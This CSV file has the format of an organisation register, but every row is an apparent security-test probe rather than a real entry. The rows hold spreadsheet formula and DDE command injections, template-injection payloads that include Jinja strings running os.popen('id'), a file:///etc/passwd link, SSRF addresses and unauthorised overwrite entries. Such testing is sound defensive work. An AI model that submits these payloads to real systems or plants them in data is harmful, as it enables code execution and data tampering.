entity,name,prefix,reference,notes,twitter,website,wikidata,wikipedia,entry-date,start-date,end-date
2999999,ARTEX Probe Corp DEV,company,PROBE999DEV,i3604 unauth csv write, ,http://127.0.0.1/,,,2026-09-18,2026-09-18,
2888888,ARTEX i4035 Insert Corp,company,PROBE4035INS,i4035 unauth csv insert,,http://127.0.0.1/,,,2026-09-18,2026-09-18,
2999999,PWNED_OVERWRITE_i4035,company,PROBE999DEV,i4035 overwrite of existing entity,,http://127.0.0.1/,,,2026-09-18,2026-09-18,
2888001,=1+1+cmd|' /C calc'!A0,company,FORMULA4035,csv formula,,http://127.0.0.1/,,,2026-09-18,2026-09-18,
2888002,{{7*7}}{{config}}{% print 7*7 %},company,SSTI4035,ssti probe,,http://127.0.0.1/,,,2026-09-18,2026-09-18,
2777001,=1+1,company,FORMULA5337,formula arith,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777013,trav name,company,TRAV5337,filename trav,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777013,trav name,company,TRAV5337,filename trav,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777013,trav name,company,TRAV5337,filename trav,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777013,trav name,company,TRAV5337,filename trav,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777013,trav name,company,TRAV5337,filename trav,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777013,trav name,company,TRAV5337,filename trav,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777002,=cmd|'/c calc'!A0,company,DDE5337,dde cmd,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777003,"=HYPERLINK(""http://127.0.0.1/artx"",""x"")",company,HYPER5337,hyperlink,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777004,{{7*7}},company,SSTI5337A,jinja math,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777005,{{config}},company,SSTI5337B,jinja config,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777006,{{lipsum.__globals__.os.popen('id').read()}},company,SSTI5337C,jinja rce,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777007,${7*7},company,SSTI5337D,freemarker,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777008,<%= 7*7 %>,company,SSTI5337E,erb,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777009,{% for x in ().__class__.__base__.__subclasses__() %}{% endfor %},company,SSTI5337F,jinja loop,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
2777010,ARTEX i5337 website file,company,FILE5337,file url,,file:///etc/passwd,,,2026-09-20,2026-09-20,
2777011,ARTEX i5337 website 127,company,SSRFI5337,ssrf url,,http://127.0.0.1/,,,2026-09-20,2026-09-20,
2777012,{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}},company,SSTI5337G,jinja req,,https://www.planning.data.gov.uk/,,,2026-09-20,2026-09-20,
